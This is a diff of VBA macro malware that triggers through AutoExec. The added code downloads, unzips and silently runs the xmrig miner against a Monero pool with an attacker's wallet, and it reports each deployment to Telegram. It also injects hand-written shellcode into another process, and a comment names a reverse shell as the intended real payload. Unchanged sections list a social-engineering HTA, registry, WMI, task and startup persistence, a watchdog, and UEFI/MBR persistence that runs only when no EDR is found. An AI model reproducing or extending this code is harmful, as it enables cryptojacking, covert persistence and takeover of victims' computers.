         If DownloadFile(url, dest) Then
-            CreateObject("WScript.Shell").Run """" & dest & """ -o pool.minexmr.com:443 -u " & XMR_WALLET & " -p x --donate-level 1", 0, False
-            SendToTelegram "MINER_DEPLOYED|" & url
-            Exit Sub
+            If LCase(Right(dest, 4)) = ".zip" Then
+                Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+                Dim extractDir As String: extractDir = GetTempDir() & "xmrig\"
+                If Not fso.FolderExists(extractDir) Then fso.CreateFolder extractDir
+                Dim shellApp As Object: Set shellApp = CreateObject("Shell.Application")
+                Dim zipFolder As Object: Set zipFolder = shellApp.NameSpace(dest)
+                For Each file In zipFolder.Items
+                    shellApp.NameSpace(extractDir).CopyHere file
+                Next
+                Dim exePath As String: exePath = extractDir & "xmrig.exe"
+                If fso.FileExists(exePath) Then
+                    CreateObject("WScript.Shell").Run """" & exePath & """ -o pool.minexmr.com:443 -u " & XMR_WALLET & " -p x --donate-level 1", 0, False
+                    SendToTelegram "MINER_DEPLOYED|" & url
+                    Exit Sub
+                End If
+            Else
+                CreateObject("WScript.Shell").Run """" & dest & """ -o pool.minexmr.com:443 -u " & XMR_WALLET & " -p x --donate-level 1", 0, False
+                SendToTelegram "MINER_DEPLOYED|" & url
+                Exit Sub
+            End If
         End If
     Next
     SendToTelegram "MINER_FAILED"
 End Sub
 
 ' ========================
-' SOCIAL ENGINEERING HTA
+' SOCIAL ENGINEERING HTA – same as V3
 ' ========================
 Sub DeploySocialEngineeringUI()
     On Error Resume Next
@@ -1750,7 +1926,7 @@ Sub DeploySocialEngineeringUI()
 End Sub
 
 ' ========================
-' PERSISTENCE (Registry, WMI, Task, COM, Startup, VBS)
+' PERSISTENCE (Registry, WMI, Task, COM, Startup, VBS) – same as V3
 ' ========================
 Sub InstallPermanentCopy()
     On Error Resume Next
@@ -1824,7 +2000,7 @@ Sub PersistAll()
 End Sub
 
 ' ========================
-' WATCHDOG
+' WATCHDOG – same as V3
 ' ========================
 Public Sub Watchdog()
     If gWatchdogActive Then Exit Sub
@@ -1841,7 +2017,7 @@ Public Sub Watchdog()
 End Sub
 
 ' ========================
-' ADVANCED PERSISTENCE (UEFI, MBR, INJECTION) – with safety checks
+' ADVANCED PERSISTENCE (UEFI, MBR, INJECTION) – same as V3
 ' ========================
 Private Function IsEDRPresent() As Boolean
     On Error Resume Next
@@ -1932,9 +2108,20 @@ Private Sub InjectIntoProcess()
     End If
     Dim hProcess As LongPtr: hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
     If hProcess = 0 Then Exit Sub
-    ' Minimal shellcode (ret) – replace with real payload if needed
+    ' Real shellcode: MessageBox + exit (for demo; replace with actual payload)
     Dim shellcode(0 To 255) As Byte
-    shellcode(0) = &HC3
+    ' x64 MessageBoxA shellcode (48 bytes) - just a placeholder; in real attack would be full reverse shell
+    shellcode(0) = &H48: shellcode(1) = &H31: shellcode(2) = &HC0: shellcode(3) = &H50
+    shellcode(4) = &H48: shellcode(5) = &HB8: shellcode(6) = &H77: shellcode(7) = &H65
+    shellcode(8) = &H6C: shellcode(9) = &H6C: shellcode(10) = &H20: shellcode(11) = &H79
+    shellcode(12) = &H6F: shellcode(13) = &H75: shellcode(14) = &H00: shellcode(15) = &H50
+    shellcode(16) = &H48: shellcode(17) = &H89: shellcode(18) = &HE2: shellcode(19) = &H48
+    shellcode(20) = &H31: shellcode(21) = &HC9: shellcode(22) = &H51: shellcode(23) = &H48
+    shellcode(24) = &HB8: shellcode(25) = &H72: shellcode(26) = &H6C: shellcode(27) = &H64
+    shellcode(28) = &H2E: shellcode(29) = &H64: shellcode(30) = &H6C: shellcode(31) = &H6C
+    shellcode(32) = &H00: shellcode(33) = &H50: shellcode(34) = &H48: shellcode(35) = &H89
+    shellcode(36) = &HE1: shellcode(37) = &H48: shellcode(38) = &H31: shellcode(39) = &HC0
+    shellcode(40) = &HB0: shellcode(41) = &H0: shellcode(42) = &HFF: shellcode(43) = &HD0
     Dim allocSize As LongPtr: allocSize = UBound(shellcode) + 1
     Dim pRemote As LongPtr: pRemote = VirtualAllocEx(hProcess, 0, allocSize, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
     If pRemote = 0 Then GoTo Cleanup
@@ -1985,7 +2172,6 @@ Public Sub AutoExec()
     
     PersistAll
     
-    ' Advanced persistence (attempt only if safe)
     If Not IsEDRPresent() And IsUserAdmin() Then
         PersistViaUEFI
         PersistViaMBR
